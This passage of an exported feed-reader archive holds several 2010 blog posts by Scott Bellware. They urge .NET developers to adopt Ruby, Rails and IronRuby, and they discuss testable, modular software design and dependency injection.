Rackspace, Engine Yard</li><li>Managed cloud fabric like Heroku if the bare-metal cloud doesn't suit you</li><li>More mature client libraries for emerging high performance storage, caching, application server, and middleware technologies</li><li>Being in a social and business community that builds game-changing products and services like Hulu, GitHub, and Twitter</li><li>Participating in the community that is making the greatest advances in TDD and testing tools and methodology</li><li>And best of all: being able to look back a year from now and realizing all that you've learned about what you thought you knew :)<br /></li></ul><br /><span style=\"font-weight: bold;\">Resistance</span><br /><br />You're going to face resistance and maybe even vilification in some cases in the .NET community if you make such a move. If you value the courage that progressive software development is all about, you'll weather the storm and build character in the process.<br /><br />If the ALT.NET community had stayed on-target with Ruby and IronRuby, there would be a good number of popular bloggers who might loose their audience. You're not in this profession to provide those with a sense of ongoing entitlement to a perpetual audience with even more entitlements. It's not your job to sit at the feet of static pattern puzzle-solving masters in a time when the necessity of those puzzles is simply no longer an absolute.<br /><br />There are a whole set of patterns waiting for your discovery and participation, and they don't require you to obscure the intension of your code with compiler pragma noise like interface types, generics, and casting.<br /><br />If you like to have your brain tickled by patterns, check out<a href=\"http://www.designpatternsinruby.com/\">Design Patterns in Ruby</a>(and consider paying close attention to the last section which offers patterns specific to Ruby and dynamic languages), or the<a href=\"http://www.amazon.com/Smalltalk-Best-Practice-Patterns-Kent/dp/013476904X\">Smalltalk Best Practice Patterns book</a>by<a href=\"http://www.threeriversinstitute.org/Kent%20Beck.htm\">Kent Beck</a>.<br /><br />Stop waiting for the next immature .NET pseudo-port of a Ruby project. Just use the Ruby version. You don't need a .NET version of Gems just so that some social-climbing .NET open source celebrity-seeker can take a firmer grip on your attention. Just use Ruby Gems. Heck, you could use Ruby Gems right now for your .NET package management.<br /><br />Stop waiting for ASP .NET MVC to catch up to Rails. Didn't you adopt open source to begin with because you were fed up with waiting for Microsoft's snail's pace of innovation and sunk-cost product management politics to catch up to the level of your expectations?<br /><br />Despite<a href=\"http://jeffreypalermo.com/\">Jeffrey Palermo's</a>recent<a href=\"http://deepfriedbytes.com/podcast/episode-48-web-development-with-asp-net-mvc-in-action-authors/\">flattering</a>of the ASP .NET MVC team's understanding of Test-Driven Development, Phil Haack and team were deeply in the weeds when it came to TDD, and to the credit of Phil's courage and integrity, he's left<a href=\"http://haacked.com/archive/2007/12/09/writing-unit-tests-for-controller-actions.aspx\">remnants of those difficult times</a>in the clear for others to learn from. Making mistakes in public and having a consistent persona both on-camera and off are critical to establishing a community of integrity. The remnants of leadership in the ALT.NET community could learn a lot from Phil about this.<br /><br />The repercussions of some naive MVC framework design decisions in ASP .NET MVC may never be rooted out of the framework because of Microsoft's bureaucratic policies regarding the need for near-infinite backward compatibility for those massive corporate Microsoft customers who cannot create the kinds of learning organizations that mitigate these kinds of problems. Rails, on the other hand, simply<a href=\"http://guides.rails.info/3_0_release_notes.html\">does not labor under the same drastic limitations</a>.<br /><br /><span style=\"font-weight: bold;\">Burn Me! I'm a Witch!</span><br /><br />I know that I'm going to catch more heat for this article. People will say that I'm unrealistic to think that .NET shops can adopt Rails, although I, and many others, have led .NET shops through Rails adoption. They may point to the Rails project failure at Dovetail as an example without pointing out that the current project at Dovetail is more than 100% over-budget, and seems to produce more open source and celebrity than money. Mention of product and team management failures at Dovetail might also also be neglected. We shall see.<br /><br />It may be said that I'm out of step with what ALT.NET has evolved into (something that I feel an immense source of personal and ethical accomplishment about) without pointing out that I'm still dedicated to living my professional life as an example of on-going community service, knowing that through the many years that I have been doing it have shown me that seemingly insurmountable changes can be made in relatively short periods of time with a community of practice focused on bigger goals than celebrity entitlement.<br /><br />And most trivially, my lack of talent in structuring short, clear sentences may be used to malign the message that they contain in an effort to continue to sideline me and my perpetual pleading for more critical thinking driven by experiential learning and community service in the .NET community.<br /><br />I haven't stopped asking the .NET community to stretch out beyond Microsoft's own sunk-cost imperatives - not since I founded the Austin .NET User Group in 2001; not since becoming chairman of the INETA speaker committee and working to get more progressive speakers involved who weren't purveyors of Microsoft's message; not since getting involved with DevTeach years before the vast majority of you had heard of it and working toward a day when the conference would feature progressive topics; not since organizing the ALT.NET Summit in an effort to insulate it and the practices that it advocates from the ravages of fleeting fad; not since writing and organizing the popular movement to redirect the Entity Framework team into more responsible and sustainable design (and subsequently quietly teaching them a Test-Driven Development workshop sans compensation); not since putting my MVP status on the line for my principles rather than allowing it or money gigs with Redmond to modulate my values; not since establishing the Progressive .NET events in London and Stockholm to encourage<span style=\"font-style: italic;\">teaching</span>in the .NET community rather than just<span style=\"font-style: italic;\">speaking</span>(although the celebrities that I'd gotten involved in that event have since refuted any responsibility to form a teaching practice and I've distanced myself from the events); not since organizing the Monospace events in Austin and Oslo to promote open source and diversity in the .NET space; not since working with the Austin Software Mentors group who are tutoring University of Texas students on contemporary software development techniques to prepare them for the real world after graduation; not since founding and facilitating the Lean Software Austin group to deepen the dialog in our community about meaningful productivity above and beyond celebrity agile; and not since connecting countless software developers to countless opportunities free of the mindlessness that accretes around entrenched entitlement power cliques in the Microsoft community.<br /><br />And I'm reaching out to you again - asking you to reconsider your adoption of ASP .NET MVC over Rails and your fixation with editor-assisted programming and design over using IronRuby and Ruby.<br /><br />There's an amazing world of capabilities that you've yet to discover far beyond static design pattern puzzles and ReSharper-Driven Development. There's a seed of courage that I'm counting on that I hope is still alive and well in .NET community even if it has been dormant for some time in the cold leadership vacuum left behind by the abandonment of .NET by some of our best and brightest.<br /><br />In the end, you live your career life for yourself and not for me. And hopefully you won't be living it for the pleasure of folks who benefit from keeping you bogged down in a status quo that serves their interests more than yours. I may be asking you to take a more giant leap than you're ready for, but at least I'm not asking you to choose stasis. And I hope that the personal sacrifices that I've made for .NET community over the past ten years have left a modicum of credibility that would have you consider this:<br /><br />IronRuby has dropped. Hear it? It will change your outlook on so much of what you do as a programmer and open you to a much broader world of software development and possibility. Trust me on this one. I've never given you a reason to doubt that I'm in your corner; that I've got your back; and that I'll drop what I'm doing to spend time with you learning and teaching rather than defending the fiefdom of my own .NET celebrity.<br /><br />IronRuby isn't a magical vessel that holds mystical truths, but it just may be the next leap forward in your programming that Dave hinted at back in 2007 before all of this proceeded from<span style=\"font-style: italic;\">movement</span>to<span style=\"font-style: italic;\">establishment</span>.<div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=Nca5F6G_-XA:0TEAUVdBPW4:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=Nca5F6G_-XA:0TEAUVdBPW4:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Nca5F6G_-XA:0TEAUVdBPW4:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/Nca5F6G_-XA\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1064}}
{"k":"0000000084","o":"0000014759","v":"001"}
{"_id":1065,"_uid":1065,"_dt":1373742612635,"_s":"091957a2a184d45d551f65cc6af6dce0"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/W54K-VcJE-A/productive-by-design.html","title":"Productive by Design","published":{"$wrap":"$date","v":1265831340004,"h":"2010-02-10T19:49:00.004Z"},"starred":false,"read":false,"content":"(Continued from:<a target=\"_blank\" href=\"http://blog.scottbellware.com/2010/02/how-mainstream-lost-software.html\">How the Mainstream Lost Software Development Productivity</a>)<br /><br />Productive designs are compartmentalized. The parts of your software are shaped to the way that your mind holds on to them.  \"Abstraction\" means the same thing to software as to thinking. \"Concern\" is another word the shows how software reflects thinking. A software \"concern\" is something that I have put my focus on that is my present concern.<br /><br />The compartmentalized bits of software are the shapes of your software's parts. The shape of your software and its parts is only one aspect of your software's design. The shapes of your software's parts is a \"static design\". \"Schema\" is another word for it. The other aspect of your software's design has to do with what happens when we bring the parts together, give them a problem to solve, and give them the green light.<br /><br />We lose software development productivity to relearning and to misunderstanding. The design quality issues that makes it hard to learn, re-learn, and understand your software also make it hard to understand how it works and whether it works. Powerful tools that optimize the moment of creation of the parts of your software enhance your ability to lower productivity.<br /><br />\"Module\" is another word for \"compartment\". A class is a module. Modular design has to be productive not only in its shape, which helps us understand how the software is broken down into concepts, but also in how those parts do some work, and how they work together, and whether they leave their tools out where you can trip on them in the dark.<br /><br />Software is a machine. It's not a machine like your car's engine or your cordless drill, or like any machine that is made with material. Analogies to physical machines break down almost immediately. There are no machines in physical space that are anything like software machines. They're machines that run individuals' personal way of thinking of how to solve a problem. There are as many ways to program a solution as there are programmers.<br /><br />Software is a machine. It's made of parts. The word \"soft\" in software says that it's easy to not only change the working of the parts, but also the shapes of the parts, and to even move the workings to a different part (which often then tells you to change the shape again).<br /><br />The first great matter of software development is proving that the new shape of some part of your software will still do what you expect it to do when you turn the machine on. The second great matter of software development is whether the shape that you've given to the software will continue to make sense, and that the workings of the software are placed in the right parts.<br /><br />There's one gigantic difference between working on software machines and working on physical machines that bears mention:<br /><br />The parts of physical machines wear out, and we replace them with another, new copy of the same part. This doesn't happen with the software parts that you make. When we change software parts, we don't replace ones that have worn out with new parts from the same mold. When we change software software parts, we change the very shape of those parts, often re-shaping the parts around them as well, and moving the workings of one part to a different part, or even a new part created on the spot as part of a new compartmentalization. In relation to a physical machine, software is much more like the mold than the product. Software development is closer to die making than stamping.<br /><br />Every time you make a change to a software machine, there's a good chance that the change shows up in an adjacent part, and there's a good chance that it'll show up when you're not looking at it. It's a lot easier to get the code you're looking at right than the code your not looking at. That's what \"<a target=\"_blank\" href=\"http://blog.scottbellware.com/2010/02/to-control-and-observe-productive.html\">control and observe</a>\" is talking about.<br /><br />To increase the chances of software working as expected after you've tried to turn a part of it into a hat, a broach, or a pterodactyl, you make observations of it. If the only way that you can observe the functioning of the part is to bring the whole machine online, your productivity is many times less than what it should be. If you can make easy observations of the part that you're working on (and maybe parts in the vicinity), you can also make those observations<span style=\"font-style: italic;\">while</span>you're working on it so that not<span style=\"font-style: italic;\">all</span>of the steps are wild leaps into the yonder.<br /><br />Imagine software that routes baggage from an airline check-in desk through the bowels of an airport's network of conveyor belts and scanners until it arrives at the right gate for the airplane that you're traveling on. Let's say you reshape the part of the software that figures out whether to route baggage to gate 1 in terminal A or to gate 2 in terminal A. Same terminal, different gate. You're losing productivity if you have to start the process from the part of the software that decides to route the baggage between terminal A or terminal B.<br /><br />Here's the problem:<br /><br />You need to observe the gate router, but you must control both the gate router and the terminal router. Controlling the terminal router now is wasted work.<br /><br />You need to feed the terminal router with the circumstances so that you're controlling it to choose the terminal A route. You also feed it the circumstances that it passes on to the gate router so that it does the thing that you expect it to, and so that you can observe that. The terminal router is superfluous in this scenario. You're concerned with the gate router, but you also have to be concerned with the terminal router's workings, even to the point of being concerned with how it gathers the information from its inner workings to pass to the gate router.<br /><br />If your concern is the workings of the gate router, then you should only have to control the gate router, feeding it the information it needs directly without going through any intermediaries. It's what \"separation of concerns\" is talking about. Collusion of concerns makes you write more code (and more complex code) to make observations about your software, but it also throws attention switching into work that is trying to be a feedback loop.<br /><br />If you have a gate routing module, you can likely control it and observe it directly. But what happens when you want to control and observe the terminal routing module? The terminal router will immediately pass the baggage off to the gate router after it has done its work. Can you control the workings of the terminal router without also having to feed it the right information that it needs to feed to the gate router so that the gate router doesn't accidentally raise an error? In other words, how do you control and observe the terminal router without having to be concerned about what the gate router needs to know to do it's job. If there was an accident rate in software development like there is in other production jobs, it would be measured by how often we accidentally have our attention sucked too far into a wood chipper of dependency inversion.<br /><br />With the right modularity, you've addressed the \"static design\". The \"dynamic design\" is how the parts of the software are put together to make the machine. A software machine is put together at runtime, usually by something called a front controller. A Main method is an example of a front controller. So is the thing that receives an HTTP request and sends its instructions it to the right part of your application. This is the part of design that a lot of developers don't recognize as the sore spot of their productivity problems.<br /><br />There some esoteric terms for this issue of controlling which modules you have to be concerned with when making observations. Much of the language is more complicated than the actual work that you have to do. If you don't get distracted by the lingo, you'll find that this is not only one of the most important problems to solve, but also one of the easiest!<br /><br />If the part of your software machine that routes baggage from the check-in desk to the right terminal passes control to the part of the software that routes the baggage to the right gate, then the terminal router will likely need to call a method on the gate router (or send a message to it). If I just want to control and observe the terminal router without having to be concerned with the gate router, then I've got problem that can be solved by getting the terminal router to use a dummy gate router instead of the real gate router. I can't change the terminal router code so that it doesn't use a gate router at all when I'm trying to make these observations, because that's not the code that would run live anyway. It wouldn't be a real observation of the thing that I'm concerned with in the first place.<br /><br />If the terminal router uses a dummy gate router, I don't have to be nearly as concerned with it as I am with my primary concern, which is the terminal router. This is what \"separation of concerns\" is talking about.<br /><br />The last thing that you have to solve is a way to switch the gate routing part for a dummy gate router. That's not a hard problem to solve. If you have a terminal router object, you can create a constructor that accepts a fake gate router. The terminal router's default constructor can create a real gate router. When you need to observe the terminal router's workings, create a dummy gate router object that doesn't have to be more talented than not raising errors when it's not supposed to and pass it to the terminal router's constructor.<br /><br />The term for this pattern is called \"inversion of control\", or \"dependency inversion\", or \"don't distract me with superfluous concerns\".<br /><br />This is a really simple way to get superfluous concerns out of the way so that they don't interfere with the parts of your software that you're actually concerned with. The above technique is sometimes called \"poor man's inversion of control\". There are many free libraries that you can use to automate all this stuff and make describing how the parts fit together effortless (or better, unnecessary). They are \"dependency injection frameworks\" or \"inversion of control containers\". I like the word \"composer\".<br /><br />The dynamic side of productive software design is all about putting the parts of the machine together when your system starts up (or on-demand). The effort that you put into the static parts of the design - the shapes, the geometry, the abstractions - is paid off when you're in complete control of which parts are in-motion when you need to make observations of your software. And to belabor the point: it's the ability to<a target=\"_blank\" href=\"http://blog.scottbellware.com/2010/02/to-control-and-observe-productive.html\">control and observe</a>your software that will give you more productivity, or to restore your productivity. You can't use what you can't understand, and you can't understand what you can't control and observe.<br /><br />If you can't directly control and observe your software, you might be<a target=\"_blank\" href=\"http://blog.scottbellware.com/2010/02/mistaking-efficiency-for-productivity.html\">mistaking efficiency for productivity</a>. You're optimizing your work within a range of improvement that is too close to the floor that make a difference in how you to get the lid off the cookie jar.<br /><br />Productivity is right there for you to reach out and harvest. It's locked up in your code like potential energy waiting to be turned into kinetic energy when you free it from its moorings. You can find it in all the ways that design interferes with your ability to work with the software that you already have. There's little value in optimizing the pace that you create new software if you're optimizing the pace that you incur compound interest.<br /><br />Productivity is usually something that you free from your software rather than something you add to software. You create the interference. If you don't want the interference, don't add it to your software.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><br /><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience<br /></p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=W54K-VcJE-A:-LFQ24PjvOY:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=W54K-VcJE-A:-LFQ24PjvOY:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=W54K-VcJE-A:-LFQ24PjvOY:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/W54K-VcJE-A\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1065}}
{"k":"0000000084","o":"0000008140","v":"001"}
{"_id":1066,"_uid":1066,"_dt":1373742612636,"_s":"69d1941bd3f84337377db7dbf5a6edc1"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/4qQ92GXNC04/denying-productivity.html","title":"Denying Productivity","published":{"$wrap":"$date","v":1265614560011,"h":"2010-02-08T07:36:00.011Z"},"starred":false,"read":false,"content":"(Continued from:<a href=\"http://blog.scottbellware.com/2010/02/cause-and-effect-and-developer.html\" target=\"_blank\">Cause and Effect and Developer Productivity</a>)<br /><br />If you choose to use the ability to<a href=\"http://blog.scottbellware.com/2010/02/to-control-and-observe-productive.html\" target=\"_blank\">control and observe</a>your software to restore and cultivate software development productivity, you have to come to terms with the reality of your software as it presently is, and dispense with the stories you tell yourself about just how much productivity your software development has. It's difficult to accept where you are if where you are is much further back than you had realized. If you don't accept where you are, you won't progress. If you already feel that you've arrived, you won't screw up the courage to challenge what it is that you know, and embark on that next stage of your career voyage.<br /><br />In the past, we've used the term \"testability\" to describe the quality of design that allows for the kinds of expectations for software development productivity caused by the ability to control and observe. To those who introduced the term to every day software development vernacular, the term has a very specific meaning, and refers to designs that are very specifically evidenced by a set of well-known and observable design principles and patterns. And to others, the term was misinterpreted and misrepresented as software that is tested.<br /><br />\"Testability\" means software that is extremely easy to test rather that software that merely has tests. Any software can be tested, what matters is how incredibly easy it is to do so. The easier it is to test software, the more that the software can be controlled and observed. The more directly that bits of your software can be controlled and observed, the more directly that your software can be understood, and the more that your software design will be simple and clear, and reflect principles productive software design.<br /><br />The level of simplicity in question is usually beyond the realm of possibility for developers who have not had experience with software that is designed to be quickly and readily understood. When the ability to understand software through the ability to control and observe is understood to be the root cause of software development productivity, the software designs that you create will be radically different than what you may have become accustomed to. And while these designs will seem foreign and strange at first, you'll soon learn to see them as the most natural, workable designs that you've created, and that you've worked with.<br /><br />For example, there's no doubt that you can control the content of an application's database from the application's user interface, but that is a far cry from a level of control that will have any significant effect on productivity, not to mention that such a means to control and observe doesn't even begin to guarantee the extent to which all the bits of software in between can be immediately understood. It's still control, and it's still control that can followed up by observation, but it isn't<span style=\"font-style: italic;\">direct control</span>and<span style=\"font-style: italic;\">direct observation</span>. If you're concerned with the behavior of your data access logic, for example, you must be able to control it directly by using your data access logic directly rather than using it transitively through an application's user interface. If you must use your application's user interface to observe the results of the control you exert on your application's database, then you're not able to satisfy your concern directly through direct observation, and you're invariably not gaining any of the great productivity benefits that come from productive design.<br /><br />Be careful of getting ahead of yourself: it doesn't lead to learning of any meaningful significance. Learning to control and observe will bring the biggest advances to your experience of software development productivity. If you stake a claim to this learning before you've barely begun, chances are you'll never really learn what it means and how to use it to any significant degree. And this would be sad, because the means to direct control over your software really isn't difficult to learn. You will be disrupted more by the mass of unlearning of what you already hold firmly as software productivity than by the small amount new learning that you'll really need.<br /><br />If you want to reach into this realm of productivity that is beyond what you've yet experienced, then commit yourself in earnest to be a student of software design principles. Learn how to apply simple software design principles and exercises to productivity. Commit to a journey to master software design from a principled perspective where productivity is your a-priory concern and the thing that you delivery consistently. You'll find that there's really not a lot to learn once you're over the initial interference of what you presently believe.<br /><br />It's vital that when you embark on the exploration of the next realm of software development productivity that you start from a realistic place, and resist every urge to claim victory before you've barely out of sight of your own home port. If you stake a claim to understanding what it is to control and observe your software, you'll deny the vast wealth of productivity that is practically within your reach.<br /><br />It's hard to start down a new path to new understanding, but denying that you need to continue learning and to challenge entrenched orthodoxy is no way to start.<br /><br />Next:<a href=\"http://blog.scottbellware.com/2010/02/how-mainstream-lost-software.html\">How the Mainstream Lost Software Development Productivity</a><br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><br /><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience<br /></p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=4qQ92GXNC04:545gNgMQI_0:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=4qQ92GXNC04:545gNgMQI_0:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=4qQ92GXNC04:545gNgMQI_0:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/4qQ92GXNC04\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1066}}
{"k":"0000000084","o":"0000004398","v":"001"}
{"_id":1067,"_uid":1067,"_dt":1373742612636,"_s":"c96c0dd14558e03109f6112363cb44b4"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/8e0zGrXBZec/video-ruby-for-net-developers-from.html","title":"Video: Ruby for .NET Developers (From the Norwegian Developers Conference)","published":{"$wrap":"$date","v":1277386200002,"h":"2010-06-24T13:30:00.002Z"},"starred":false,"read":false,"content":"My presentation at the<a href=\"http://www.ndc2010.no/\">Norwegian Developers Conference</a>, \"Ruby for .NET Developers\" is available for viewing on<a href=\"http://vimeo.com/\">Vimeo</a>.<br /><br />There's a bit of off-color humor in the talk for the sake of making a point about orthodoxy, and done specifically-so for the European audience that it was presented to. So, no offense intended! :)<br /><br />View it here or<a href=\"http://vimeo.com/12803005\">open it on Vimeo's site</a>for more viewing options.<br /><br /><object height=\"255\" width=\"600\"><param name=\"allowfullscreen\" value=\"true\"><param name=\"allowscriptaccess\" value=\"always\"><param name=\"movie\" value=\"http://vimeo.com/moogaloop.swf?clip_id=12803005&server=vimeo.com&show_title=1&show_byline=1&show_portrait=0&color=00ADEF&fullscreen=1\"><embed src=\"http://vimeo.com/moogaloop.swf?clip_id=12803005&server=vimeo.com&show_title=1&show_byline=1&show_portrait=0&color=00ADEF&fullscreen=1\" type=\"application/x-shockwave-flash\" allowfullscreen=\"true\" allowscriptaccess=\"always\" height=\"255\" width=\"600\"></embed></object><br /><br />Here's the description of the presentation:<br /><br />After having spent many years coding in C#, and after having spent equally as much time in the C# language culture, Ruby seemed like a lot of bad ideas and heresy. In fact, much of Ruby is heretical to a C# or VB.NET mono–culture, but the productivity gains demonstrated by Ruby on Rails teams remains an unavoidable elephant in the room. This presentation looks at C# code examples side by side with some equivalent Ruby code and shines a little light on what it means to have either \"ceremony\" and \"essence\". It challenges the claims of static typing's effect on tooling to deliver \"developer productivity\". And finally, some examples of Ruby meta programming are given to demonstrate direct solutions to programming problems that would require much ado with restrictions in C# that don't end up doing much more than reducing the efficiency of software development efforts.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=8e0zGrXBZec:_TMHvzc_kcE:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=8e0zGrXBZec:_TMHvzc_kcE:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=8e0zGrXBZec:_TMHvzc_kcE:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/8e0zGrXBZec\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1067}}
{"k":"0000000084","o":"0000010300","v":"001"}
{"_id":1068,"_uid":1068,"_dt":1373742612636,"_s":"2e78cb858b2acf59507ea5b926439a59"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/o2t8Ir5oerw/how-mainstream-lost-software.html","title":"How the Mainstream Lost Software Development Productivity","published":{"$wrap":"$date","v":1265626440006,"h":"2010-02-08T10:54:00.006Z"},"starred":false,"read":false,"content":"(Continued from:<a href=\"http://blog.scottbellware.com/2010/02/denying-productivity.html\" target=\"_blank\">Denying Productivity</a>)<br /><br />The greatest software development productivity comes from software that can be easily and readily understood. When you need to make changes to software, you can easily and readily understand the repercussions of those changes. When you need to add new abilities to software, you can easily and readily understand where the additions need to be made. When you're new to an existing project, you can easily understand the code that has already been written by your new team. Understanding how to design software so that you're able to easily<a href=\"http://blog.scottbellware.com/2010/02/to-control-and-observe-productive.html\" target=\"_blank\">control and observe</a>it gives you the ability to create software that can be understood, and software that doesn't obstruct productivity.<br /><br />Despite the number of software developers who understand the mechanics and principles of software design that cultivate software development productivity, the vast majority of software developers don't understand how to wield the techniques, or aren't convinced by the promises, or simply haven't heard about higher order developer productivity at all, let alone how to get it.<br /><br />Somewhere along the line, the software development mainstream lost its access to productivity, and the vacuum was filed with<a href=\"http://blog.scottbellware.com/2010/02/mistaking-efficiency-for-productivity.html\" target=\"_blank\">counter 